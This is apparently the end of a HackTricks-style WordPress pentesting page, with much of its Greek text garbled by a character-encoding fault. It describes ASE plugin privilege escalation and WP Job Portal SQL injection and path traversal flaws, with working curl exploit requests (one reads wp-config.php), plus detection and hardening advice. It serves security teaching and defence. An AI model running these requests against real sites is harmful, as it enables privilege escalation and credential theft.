- Î•Î¼Ï€Î¹ÏƒÏ„ÎµÏÎµÏ„Î±Î¹ Ï„Î¿ `$_REQUEST['reset-for']` ÎºÎ±Î¹ Î¼Î¹Î± ÎµÏ€Î¹Î»Î¿Î³Î® Ï„Î¿Ï… plugin Ï‡Ï‰ÏÎ¯Ï‚ ÎµÎ¾Î¿Ï…ÏƒÎ¹Î¿Î´ÏŒÏ„Î·ÏƒÎ· Î±Ï€ÏŒ Ï„Î·Î½ Ï€Î»ÎµÏ…ÏÎ¬ Ï„Î¿Ï… Î´Î¹Î±ÎºÎ¿Î¼Î¹ÏƒÏ„Î®.
- Î‘Î½ Î­Î½Î±Ï‚ Ï‡ÏÎ®ÏƒÏ„Î·Ï‚ Ï€ÏÎ¿Î·Î³Î¿Ï…Î¼Î­Î½Ï‰Ï‚ ÎµÎ¯Ï‡Îµ Ï…ÏˆÎ·Î»ÏŒÏ„ÎµÏÎ± Ï€ÏÎ¿Î½ÏŒÎ¼Î¹Î± Î±Ï€Î¿Î¸Î·ÎºÎµÏ…Î¼Î­Î½Î± ÏƒÏ„Î¿ `_asenha_view_admin_as_original_roles` ÎºÎ±Î¹ Ï…Ï€Î¿Î²Î±Î¸Î¼Î¯ÏƒÏ„Î·ÎºÎµ, Î¼Ï€Î¿ÏÎµÎ¯ Î½Î± Ï„Î± ÎµÏ€Î±Î½Î±Ï†Î­ÏÎµÎ¹ Ï€Î±Ï„ÏÎ½Ï„Î±Ï‚ ÏƒÏ„Î· Î´Î¹Î±Î´ÏÎ¿Î¼Î® ÎµÏ€Î±Î½Î±Ï†Î¿ÏÎ¬Ï‚.
- Î£Îµ Î¿ÏÎ¹ÏƒÎ¼Î­Î½ÎµÏ‚ Î±Î½Î±Ï€Ï„ÏÎ¾ÎµÎ¹Ï‚, Î¿Ï€Î¿Î¹Î¿ÏƒÎ´Î®Ï€Î¿Ï„Îµ Ï€Î¹ÏƒÏ„Î¿Ï€Î¿Î¹Î·Î¼Î­Î½Î¿Ï‚ Ï‡ÏÎ®ÏƒÏ„Î·Ï‚ Î¸Î± Î¼Ï€Î¿ÏÎ¿ÏÏƒÎµ Î½Î± ÎµÎ½ÎµÏÎ³Î¿Ï€Î¿Î¹Î®ÏƒÎµÎ¹ Î¼Î¹Î± ÎµÏ€Î±Î½Î±Ï†Î¿ÏÎ¬ Î³Î¹Î± Î¬Î»Î»Î¿ ÏŒÎ½Î¿Î¼Î± Ï‡ÏÎ®ÏƒÏ„Î· Ï€Î¿Ï… ÎµÎ¾Î±ÎºÎ¿Î»Î¿Ï…Î¸ÎµÎ¯ Î½Î± Ï…Ï€Î¬ÏÏ‡ÎµÎ¹ ÏƒÏ„Î¿ `viewing_admin_as_role_are` (ÏƒÏ†Î¬Î»Î¼Î± ÎµÎ¾Î¿Ï…ÏƒÎ¹Î¿Î´ÏŒÏ„Î·ÏƒÎ·Ï‚).

Attack prerequisites

- Î•Ï…Î¬Î»Ï‰Ï„Î· Î­ÎºÎ´Î¿ÏƒÎ· Ï„Î¿Ï… plugin Î¼Îµ Ï„Î· Î»ÎµÎ¹Ï„Î¿Ï…ÏÎ³Î¯Î± ÎµÎ½ÎµÏÎ³Î¿Ï€Î¿Î¹Î·Î¼Î­Î½Î·.
- ÎŸ Î»Î¿Î³Î±ÏÎ¹Î±ÏƒÎ¼ÏŒÏ‚-ÏƒÏ„ÏŒÏ‡Î¿Ï‚ Î­Ï‡ÎµÎ¹ Î­Î½Î± Ï€Î±Î»Î¹ÏŒ ÏÏŒÎ»Î¿ Î¼Îµ Ï…ÏˆÎ·Î»Î¬ Ï€ÏÎ¿Î½ÏŒÎ¼Î¹Î± Î±Ï€Î¿Î¸Î·ÎºÎµÏ…Î¼Î­Î½Î¿ ÏƒÏ„Î± user meta Î±Ï€ÏŒ Ï€ÏÎ¿Î·Î³Î¿ÏÎ¼ÎµÎ½Î· Ï‡ÏÎ®ÏƒÎ·.
- ÎŸÏ€Î¿Î¹Î±Î´Î®Ï€Î¿Ï„Îµ Ï€Î¹ÏƒÏ„Î¿Ï€Î¿Î¹Î·Î¼Î­Î½Î· ÏƒÏ…Î½ÎµÎ´ÏÎ¯Î±; Î±Ï€Î¿Ï…ÏƒÎ¯Î± nonce/capability ÏƒÏ„Î· ÏÎ¿Î® ÎµÏ€Î±Î½Î±Ï†Î¿ÏÎ¬Ï‚.

Exploitation (example)
```bash
# While logged in as the downgraded user (or any auth user able to trigger the code path),
# hit any route that executes the role-switcher logic and include the reset parameter.
# The plugin uses $_REQUEST, so GET or POST works. The exact route depends on the plugin hooks.
curl -s -k -b 'wordpress_logged_in=...' \
'https://victim.example/wp-admin/?reset-for=<your_username>'
```
Î£Îµ ÎµÏ…Î¬Î»Ï‰Ï„ÎµÏ‚ ÎµÎºÎ´ÏŒÏƒÎµÎ¹Ï‚ Î±Ï…Ï„ÏŒ Î±Ï†Î±Î¹ÏÎµÎ¯ Ï„Î¿Ï…Ï‚ Ï„ÏÎ­Ï‡Î¿Î½Ï„ÎµÏ‚ ÏÏŒÎ»Î¿Ï…Ï‚ ÎºÎ±Î¹ ÎµÏ€Î±Î½Î±Ï€ÏÎ¿ÏƒÎ¸Î­Ï„ÎµÎ¹ Ï„Î¿Ï…Ï‚ Î±Ï€Î¿Î¸Î·ÎºÎµÏ…Î¼Î­Î½Î¿Ï…Ï‚ â€œoriginal rolesâ€ (Ï€.Ï‡., `administrator`), Î±Ï…Î¾Î¬Î½Î¿Î½Ï„Î±Ï‚ Î¿Ï…ÏƒÎ¹Î±ÏƒÏ„Î¹ÎºÎ¬ Ï„Î± Ï€ÏÎ¿Î½ÏŒÎ¼Î¹Î±.

Detection checklist

- Î¨Î¬Î¾Ï„Îµ Î³Î¹Î± role-switching features Ï€Î¿Ï… Î´Î¹Î±Ï„Î·ÏÎ¿ÏÎ½ Ï„Î¿Ï…Ï‚ â€œoriginal rolesâ€ ÏƒÏ„Î¿ user meta (Ï€.Ï‡., `_asenha_view_admin_as_original_roles`).
- Î•Î½Ï„Î¿Ï€Î¯ÏƒÏ„Îµ Î´Î¹Î±Î´ÏÎ¿Î¼Î­Ï‚ ÎµÏ€Î±Î½ÎµÎºÎºÎ¯Î½Î·ÏƒÎ·Ï‚/restore Ï€Î¿Ï…:
- Î”Î¹Î±Î²Î¬Î¶Î¿Ï…Î½ Î¿Î½ÏŒÎ¼Î±Ï„Î± Ï‡ÏÎ·ÏƒÏ„ÏÎ½ Î±Ï€ÏŒ `$_REQUEST` / `$_GET` / `$_POST`.
- Î¤ÏÎ¿Ï€Î¿Ï€Î¿Î¹Î¿ÏÎ½ ÏÏŒÎ»Î¿Ï…Ï‚ Î¼Î­ÏƒÏ‰ `add_role()` / `remove_role()` Ï‡Ï‰ÏÎ¯Ï‚ `current_user_can()` ÎºÎ±Î¹ `wp_verify_nonce()` / `check_admin_referer()`.
- Î•Î¾Î¿Ï…ÏƒÎ¹Î¿Î´Î¿Ï„Î¿ÏÎ½ Î²Î¬ÏƒÎµÎ¹ ÎµÎ½ÏŒÏ‚ plugin option array (Ï€.Ï‡., `viewing_admin_as_role_are`) Î±Î½Ï„Î¯ Î³Î¹Î± Ï„Î¹Ï‚ Î´Ï…Î½Î±Ï„ÏŒÏ„Î·Ï„ÎµÏ‚ Ï„Î¿Ï… ÎµÎ½ÎµÏÎ³Î¿ÏÎ½Ï„Î¿Ï‚ Ï‡ÏÎ®ÏƒÏ„Î·.

Hardening

- Î•Ï€Î¹Î²Î¬Î»ÎµÏ„Îµ ÎµÎ»Î­Î³Ï‡Î¿Ï…Ï‚ Î´Ï…Î½Î±Ï„Î¿Ï„Î®Ï„Ï‰Î½ ÏƒÎµ ÎºÎ¬Î¸Îµ ÎºÎ»Î¬Î´Î¿ Ï€Î¿Ï… Î±Î»Î»Î¬Î¶ÎµÎ¹ ÎºÎ±Ï„Î¬ÏƒÏ„Î±ÏƒÎ· (Ï€.Ï‡., `current_user_can('manage_options')` Î® Î±Ï…ÏƒÏ„Î·ÏÏŒÏ„ÎµÏÎ¿).
- Î‘Ï€Î±Î¹Ï„Î®ÏƒÏ„Îµ nonces Î³Î¹Î± ÏŒÎ»ÎµÏ‚ Ï„Î¹Ï‚ Î¼ÎµÏ„Î±Î²Î¿Î»Î­Ï‚ ÏÏŒÎ»Ï‰Î½/Î´Î¹ÎºÎ±Î¹Ï‰Î¼Î¬Ï„Ï‰Î½ ÎºÎ±Î¹ ÎµÏ€Î±Î»Î·Î¸ÎµÏÏƒÏ„Îµ Ï„Î±: `check_admin_referer()` / `wp_verify_nonce()`.
- ÎœÎ·Î½ ÎµÎ¼Ï€Î¹ÏƒÏ„ÎµÏÎµÏƒÏ„Îµ Ï€Î¿Ï„Î­ Î¿Î½ÏŒÎ¼Î±Ï„Î± Ï‡ÏÎ·ÏƒÏ„ÏÎ½ Ï€Î¿Ï… Ï€ÏÎ¿Î­ÏÏ‡Î¿Î½Ï„Î±Î¹ Î±Ï€ÏŒ Ï„Î¿ requestÂ· ÎµÏ€Î¹Î»ÏÏƒÏ„Îµ Ï„Î¿Î½ ÏƒÏ„Î¿Ï‡ÎµÏ…ÏŒÎ¼ÎµÎ½Î¿ Ï‡ÏÎ®ÏƒÏ„Î· server-side Î²Î¬ÏƒÎµÎ¹ Ï„Î¿Ï… ÎµÏ€Î±Î»Î·Î¸ÎµÏ…Î¼Î­Î½Î¿Ï… Ï‡ÏÎ®ÏƒÏ„Î· ÎºÎ±Î¹ ÏÎ·Ï„Î®Ï‚ Ï€Î¿Î»Î¹Ï„Î¹ÎºÎ®Ï‚.
- Î‘ÎºÏ…ÏÏÏƒÏ„Îµ Ï„Î·Î½ ÎºÎ±Ï„Î¬ÏƒÏ„Î±ÏƒÎ· â€œoriginal rolesâ€ ÎºÎ±Ï„Î¬ Ï„Î¹Ï‚ ÎµÎ½Î·Î¼ÎµÏÏÏƒÎµÎ¹Ï‚ Ï€ÏÎ¿Ï†Î¯Î»/ÏÏŒÎ»Ï‰Î½ Î³Î¹Î± Î½Î± Î±Ï€Î¿Ï†ÏÎ³ÎµÏ„Îµ Ï„Î·Î½ ÎµÏ€Î±Î½Î±Ï†Î¿ÏÎ¬ Ï€Î±Î»Î±Î¹ÏÎ½ Ï…ÏˆÎ·Î»ÏÎ½ Ï€ÏÎ¿Î½Î¿Î¼Î¯Ï‰Î½:
```php
add_action( 'profile_update', function( $user_id ) {
delete_user_meta( $user_id, '_asenha_view_admin_as_original_roles' );
}, 10, 1 );
```
- Î£ÎºÎµÏ†Ï„ÎµÎ¯Ï„Îµ Î½Î± Î±Ï€Î¿Î¸Î·ÎºÎµÏÎµÏ„Îµ Ï„Î·Î½ ÎµÎ»Î¬Ï‡Î¹ÏƒÏ„Î· Î´Ï…Î½Î±Ï„Î® ÎºÎ±Ï„Î¬ÏƒÏ„Î±ÏƒÎ· ÎºÎ±Î¹ Î½Î± Ï‡ÏÎ·ÏƒÎ¹Î¼Î¿Ï€Î¿Î¹ÎµÎ¯Ï„Îµ Ï‡ÏÎ¿Î½Î¹ÎºÎ¬ Ï€ÎµÏÎ¹Î¿ÏÎ¹ÏƒÎ¼Î­Î½Î±, Î´Î¹Î±ÎºÏÎ¹Ï„Î¹ÎºÎ¬ Î¼Îµ Î­Î»ÎµÎ³Ï‡Î¿ Î¹ÎºÎ±Î½Î¿Ï„Î®Ï„Ï‰Î½ Î³Î¹Î± Ï€ÏÎ¿ÏƒÏ‰ÏÎ¹Î½Î­Ï‚ Î±Î»Î»Î±Î³Î­Ï‚ ÏÏŒÎ»Î¿Ï….

---

### WAF considerations for WordPress/plugin CVEs

Generic edge/server WAFs are tuned for broad patterns (SQLi, XSS, LFI). Many highâ€‘impact WordPress/plugin flaws are application-specific logic/auth bugs that look like benign traffic unless the engine understands WordPress routes and plugin semantics.

Offensive notes

- Target plugin-specific endpoints with clean payloads: `admin-ajax.php?action=...`, `wp-json/<namespace>/<route>`, custom file handlers, shortcodes.
- Exercise unauth paths first (AJAX `nopriv`, REST with permissive `permission_callback`, public shortcodes). Default payloads often succeed without obfuscation.
- Typical high-impact cases: privilege escalation (broken access control), arbitrary file upload/download, LFI, open redirect.

Defensive notes

- Donâ€™t rely on generic WAF signatures to protect plugin CVEs. Implement application-layer, vulnerability-specific virtual patches or update quickly.
- Prefer positive-security checks in code (capabilities, nonces, strict input validation) over negative regex filters.

## Î ÏÎ¿ÏƒÏ„Î±ÏƒÎ¯Î± WordPress

### Î¤Î±ÎºÏ„Î¹ÎºÎ­Ï‚ ÎµÎ½Î·Î¼ÎµÏÏÏƒÎµÎ¹Ï‚

Î’ÎµÎ²Î±Î¹Ï‰Î¸ÎµÎ¯Ï„Îµ ÏŒÏ„Î¹ Ï„Î¿ WordPress, Ï„Î± plugins ÎºÎ±Î¹ Ï„Î± themes ÎµÎ¯Î½Î±Î¹ ÎµÎ½Î·Î¼ÎµÏÏ‰Î¼Î­Î½Î±. Î•Ï€Î¹Î²ÎµÎ²Î±Î¹ÏÏƒÏ„Îµ ÎµÏ€Î¯ÏƒÎ·Ï‚ ÏŒÏ„Î¹ Î· Î±Ï…Ï„Î¿Î¼Î±Ï„Î¿Ï€Î¿Î¹Î·Î¼Î­Î½Î· ÎµÎ½Î·Î¼Î­ÏÏ‰ÏƒÎ· ÎµÎ¯Î½Î±Î¹ ÎµÎ½ÎµÏÎ³Î¿Ï€Î¿Î¹Î·Î¼Î­Î½Î· ÏƒÏ„Î¿ wp-config.php:
```bash
define( 'WP_AUTO_UPDATE_CORE', true );
add_filter( 'auto_update_plugin', '__return_true' );
add_filter( 'auto_update_theme', '__return_true' );
```
Î•Ï€Î¯ÏƒÎ·Ï‚, **ÎµÎ³ÎºÎ±Ï„Î±ÏƒÏ„Î®ÏƒÏ„Îµ Î¼ÏŒÎ½Î¿ Î±Î¾Î¹ÏŒÏ€Î¹ÏƒÏ„Î± WordPress plugins ÎºÎ±Î¹ themes**.

### Î ÏÏŒÏƒÎ¸ÎµÏ„Î± Î‘ÏƒÏ†Î¬Î»ÎµÎ¹Î±Ï‚

- [**Wordfence Security**](https://wordpress.org/plugins/wordfence/)
- [**Sucuri Security**](https://wordpress.org/plugins/sucuri-scanner/)
- [**iThemes Security**](https://wordpress.org/plugins/better-wp-security/)

### **Î†Î»Î»ÎµÏ‚ Î£Ï…ÏƒÏ„Î¬ÏƒÎµÎ¹Ï‚**

- Î‘Ï†Î±Î¹ÏÎ­ÏƒÏ„Îµ Ï„Î¿Î½ Ï€ÏÎ¿ÎµÏ€Î¹Î»ÎµÎ³Î¼Î­Î½Î¿ Ï‡ÏÎ®ÏƒÏ„Î· **admin**
- Î§ÏÎ·ÏƒÎ¹Î¼Î¿Ï€Î¿Î¹Î®ÏƒÏ„Îµ **Î¹ÏƒÏ‡Ï…ÏÎ¿ÏÏ‚ ÎºÏ‰Î´Î¹ÎºÎ¿ÏÏ‚** ÎºÎ±Î¹ **2FA**
- Î ÎµÏÎ¹Î¿Î´Î¹ÎºÎ¬ **ÎµÎ»Î­Î³Î¾Ï„Îµ** Ï„Î± **Î´Î¹ÎºÎ±Î¹ÏÎ¼Î±Ï„Î±** Ï„Ï‰Î½ Ï‡ÏÎ·ÏƒÏ„ÏÎ½
- **Î ÎµÏÎ¹Î¿ÏÎ¯ÏƒÏ„Îµ** Ï„Î¹Ï‚ Ï€ÏÎ¿ÏƒÏ€Î¬Î¸ÎµÎ¹ÎµÏ‚ ÏƒÏÎ½Î´ÎµÏƒÎ·Ï‚ Î³Î¹Î± Î½Î± Î±Ï€Î¿Ï„ÏÎ­ÏˆÎµÏ„Îµ ÎµÏ€Î¹Î¸Î­ÏƒÎµÎ¹Ï‚ Brute Force
- ÎœÎµÏ„Î¿Î½Î¿Î¼Î¬ÏƒÏ„Îµ Ï„Î¿ Î±ÏÏ‡ÎµÎ¯Î¿ **`wp-admin.php`** ÎºÎ±Î¹ ÎµÏ€Î¹Ï„ÏÎ­ÏˆÏ„Îµ Ï€ÏÏŒÏƒÎ²Î±ÏƒÎ· Î¼ÏŒÎ½Î¿ ÎµÏƒÏ‰Ï„ÎµÏÎ¹ÎºÎ¬ Î® Î±Ï€ÏŒ ÏƒÏ…Î³ÎºÎµÎºÏÎ¹Î¼Î­Î½ÎµÏ‚ Î´Î¹ÎµÏ…Î¸ÏÎ½ÏƒÎµÎ¹Ï‚ IP.


### ÎœÎ· Î±Ï…Î¸ÎµÎ½Ï„Î¹ÎºÎ¿Ï€Î¿Î¹Î·Î¼Î­Î½Î· SQL Injection Î¼Î­ÏƒÏ‰ Î±Î½ÎµÏ€Î±ÏÎºÎ¿ÏÏ‚ ÎµÏ€Î¹ÎºÏÏÏ‰ÏƒÎ·Ï‚ (WP Job Portal <= 2.3.2)

Î¤Î¿ Ï€ÏÏŒÏƒÎ¸ÎµÏ„Î¿ Ï€ÏÏŒÏƒÎ»Î·ÏˆÎ·Ï‚ WP Job Portal Î±Ï€Î¿ÎºÎ¬Î»Ï…Ï€Ï„Îµ Î¼Î¹Î± ÎµÏÎ³Î±ÏƒÎ¯Î± **savecategory** Ï€Î¿Ï… Ï„ÎµÎ»Î¹ÎºÎ¬ ÎµÎºÏ„ÎµÎ»ÎµÎ¯ Ï„Î¿Î½ Î±ÎºÏŒÎ»Î¿Ï…Î¸Î¿ ÎµÏ…Î¬Î»Ï‰Ï„Î¿ ÎºÏÎ´Î¹ÎºÎ± Î¼Î­ÏƒÎ± ÏƒÏ„Î¿ `modules/category/model.php::validateFormData()`:
```php
$category  = WPJOBPORTALrequest::getVar('parentid');
$inquery   = ' ';
if ($category) {
$inquery .= " WHERE parentid = $category ";   // <-- direct concat âœ—
}
$query  = "SELECT max(ordering)+1 AS maxordering FROM "
. wpjobportal::$_db->prefix . "wj_portal_categories " . $inquery; // executed later
```
Î ÏÎ¿Î²Î»Î®Î¼Î±Ï„Î± Ï€Î¿Ï… ÎµÎ¹ÏƒÎ¬Î³ÎµÎ¹ Î±Ï…Ï„ÏŒ Ï„Î¿ Î±Ï€ÏŒÏƒÏ€Î±ÏƒÎ¼Î±:

1. **ÎœÎ· Ï†Î¹Î»Ï„ÏÎ±ÏÎ¹ÏƒÎ¼Î­Î½Î· ÎµÎ¯ÏƒÎ¿Î´Î¿Ï‚ Ï‡ÏÎ®ÏƒÏ„Î·** â€“ `parentid` Ï€ÏÎ¿Î­ÏÏ‡ÎµÏ„Î±Î¹ Î±Ï€ÎµÏ…Î¸ÎµÎ¯Î±Ï‚ Î±Ï€ÏŒ Ï„Î¿ Î±Î¯Ï„Î·Î¼Î± HTTP.
2. **Î£Ï…Î½Î­Î½Ï‰ÏƒÎ· ÏƒÏ…Î¼Î²Î¿Î»Î¿ÏƒÎµÎ¹ÏÏÎ½ Î¼Î­ÏƒÎ± ÏƒÏ„Î·Î½ WHERE clause** â€“ Î´ÎµÎ½ Ï…Ï€Î¬ÏÏ‡Î¿Ï…Î½ `is_numeric()` / `esc_sql()` / prepared statement.
3. **ÎœÎ·-ÎµÏ€Î±Î»Î·Î¸ÎµÏ…Î¼Î­Î½Î· Ï€ÏÎ¿ÏƒÎ²Î±ÏƒÎ¹Î¼ÏŒÏ„Î·Ï„Î±** â€“ Ï€Î±ÏÏŒÎ»Î¿ Ï€Î¿Ï… Î· ÎµÎ½Î­ÏÎ³ÎµÎ¹Î± ÎµÎºÏ„ÎµÎ»ÎµÎ¯Ï„Î±Î¹ Î¼Î­ÏƒÏ‰ Ï„Î¿Ï… `admin-post.php`, Î¿ Î¼Î¿Î½Î±Î´Î¹ÎºÏŒÏ‚ Î­Î»ÎµÎ³Ï‡Î¿Ï‚ Ï€Î¿Ï… Ï…Ï€Î¬ÏÏ‡ÎµÎ¹ ÎµÎ¯Î½Î±Î¹ Î­Î½Î± **CSRF nonce** (`wp_verify_nonce()`), Ï„Î¿ Î¿Ï€Î¿Î¯Î¿ Î¿Ï€Î¿Î¹Î¿ÏƒÎ´Î®Ï€Î¿Ï„Îµ ÎµÏ€Î¹ÏƒÎºÎ­Ï€Ï„Î·Ï‚ Î¼Ï€Î¿ÏÎµÎ¯ Î½Î± Î±Î½Î±ÎºÏ„Î®ÏƒÎµÎ¹ Î±Ï€ÏŒ Î¼Î¹Î± Î´Î·Î¼ÏŒÏƒÎ¹Î± ÏƒÎµÎ»Î¯Î´Î± Ï€Î¿Ï… ÎµÎ½ÏƒÏ‰Î¼Î±Ï„ÏÎ½ÎµÎ¹ Ï„Î¿ shortcode `[wpjobportal_my_resumes]`.

#### Î•ÎºÎ¼ÎµÏ„Î¬Î»Î»ÎµÏ…ÏƒÎ·

1. Î‘Î½Î¬ÎºÏ„Î·ÏƒÎ· Î½Î­Î¿Ï… nonce:
```bash
curl -s https://victim.com/my-resumes/ | grep -oE 'name="_wpnonce" value="[a-f0-9]+' | cut -d'"' -f4
```
2. Î•Î¹ÏƒÎ±Î³Ï‰Î³Î® Î±Ï…Î¸Î±Î¯ÏÎµÏ„Î¿Ï… SQL ÎµÎºÎ¼ÎµÏ„Î±Î»Î»ÎµÏ…ÏŒÎ¼ÎµÎ½Î¿Î¹ Ï„Î¿ `parentid`:
```bash
curl -X POST https://victim.com/wp-admin/admin-post.php \
-d 'task=savecategory' \
-d '_wpnonce=<nonce>' \
-d 'parentid=0 OR 1=1-- -' \
-d 'cat_title=pwn' -d 'id='
```
Î— Î±Ï€Î¬Î½Ï„Î·ÏƒÎ· Î±Ï€Î¿ÎºÎ±Î»ÏÏ€Ï„ÎµÎ¹ Ï„Î¿ Î±Ï€Î¿Ï„Î­Î»ÎµÏƒÎ¼Î± Ï„Î¿Ï… ÎµÎ¹ÏƒÎ±Î³ÏŒÎ¼ÎµÎ½Î¿Ï… ÎµÏÏ‰Ï„Î®Î¼Î±Ï„Î¿Ï‚ Î® Ï„ÏÎ¿Ï€Î¿Ï€Î¿Î¹ÎµÎ¯ Ï„Î· Î²Î¬ÏƒÎ· Î´ÎµÎ´Î¿Î¼Î­Î½Ï‰Î½, Î±Ï€Î¿Î´ÎµÎ¹ÎºÎ½ÏÎ¿Î½Ï„Î±Ï‚ SQLi.


### Unauthenticated Arbitrary File Download / Path Traversal (WP Job Portal <= 2.3.2)

ÎœÎ¹Î± Î¬Î»Î»Î· Î»ÎµÎ¹Ï„Î¿Ï…ÏÎ³Î¯Î±, **downloadcustomfile**, ÎµÏ€Î­Ï„ÏÎµÏ€Îµ ÏƒÎµ ÎµÏ€Î¹ÏƒÎºÎ­Ï€Ï„ÎµÏ‚ Î½Î± ÎºÎ±Ï„ÎµÎ²Î¬ÏƒÎ¿Ï…Î½ **Î¿Ï€Î¿Î¹Î¿Î´Î®Ï€Î¿Ï„Îµ Î±ÏÏ‡ÎµÎ¯Î¿ ÏƒÏ„Î¿ Î´Î¯ÏƒÎºÎ¿** Î¼Î­ÏƒÏ‰ path traversal. Î¤Î¿ ÎµÏ…Î¬Î»Ï‰Ï„Î¿ sink Î²ÏÎ¯ÏƒÎºÎµÏ„Î±Î¹ ÏƒÏ„Î¿ `modules/customfield/model.php::downloadCustomUploadedFile()`:
```php
$file = $path . '/' . $file_name;
...
echo $wp_filesystem->get_contents($file); // raw file output
```
`$file_name` ÎµÎ¯Î½Î±Î¹ attacker-controlled ÎºÎ±Î¹ ÏƒÏ…Î½ÎµÎ½ÏÎ½ÎµÏ„Î±Î¹ **without sanitisation**. ÎÎ±Î½Î¬, Ï„Î¿ Î¼ÏŒÎ½Î¿ ÎµÎ¼Ï€ÏŒÎ´Î¹Î¿ ÎµÎ¯Î½Î±Î¹ Î­Î½Î± **CSRF nonce** Ï€Î¿Ï… Î¼Ï€Î¿ÏÎµÎ¯ Î½Î± Î»Î·Ï†Î¸ÎµÎ¯ Î±Ï€ÏŒ Ï„Î· ÏƒÎµÎ»Î¯Î´Î± resume.

#### Exploitation
```bash
curl -G https://victim.com/wp-admin/admin-post.php \
--data-urlencode 'task=downloadcustomfile' \
--data-urlencode '_wpnonce=<nonce>' \
--data-urlencode 'upload_for=resume' \
--data-urlencode 'entity_id=1' \
--data-urlencode 'file_name=../../../wp-config.php'
```
ÎŸ Î´Î¹Î±ÎºÎ¿Î¼Î¹ÏƒÏ„Î®Ï‚ Î±Ï€Î±Î½Ï„Î¬ Î¼Îµ Ï„Î± Ï€ÎµÏÎ¹ÎµÏ‡ÏŒÎ¼ÎµÎ½Î± Ï„Î¿Ï… `wp-config.php`, leaking DB credentials and auth keys.

## Î‘Î½Î±Ï†Î¿ÏÎ­Ï‚

- [Unauthenticated Arbitrary File Deletion Vulnerability in Litho Theme](https://patchstack.com/articles/unauthenticated-arbitrary-file-delete-vulnerability-in-litho-the/)
- [Multiple Critical Vulnerabilities Patched in WP Job Portal Plugin](https://patchstack.com/articles/multiple-critical-vulnerabilities-patched-in-wp-job-portal-plugin/)
- [Rare Case of Privilege Escalation in ASE Plugin Affecting 100k+ Sites](https://patchstack.com/articles/rare-case-of-privilege-escalation-in-ase-plugin-affecting-100k-sites/)
- [ASE 7.6.3 changeset â€“ delete original roles on profile update](https://plugins.trac.wordpress.org/changeset/3211945/admin-site-enhancements/tags/7.6.3/classes/class-view-admin-as-role.php?old=3208295&old_path=admin-site-enhancements%2Ftags%2F7.6.2%2Fclasses%2Fclass-view-admin-as-role.php)
- [Hosting security tested: 87.8% of vulnerability exploits bypassed hosting defenses](https://patchstack.com/articles/hosting-security-tested-87-percent-of-vulnerability-exploits-bypassed-hosting-defenses/)
- [WooCommerce Payments â‰¤ 5.6.1 â€“ Unauth privilege escalation via trusted header (Patchstack DB)](https://patchstack.com/database/wordpress/plugin/woocommerce-payments/vulnerability/wordpress-woocommerce-payments-plugin-5-6-1-unauthenticated-privilege-escalation-vulnerability)
- [Hackers exploiting critical WordPress WooCommerce Payments bug](https://www.bleepingcomputer.com/news/security/hackers-exploiting-critical-wordpress-woocommerce-payments-bug/)

{{#include ../../banners/hacktricks-training.md}}
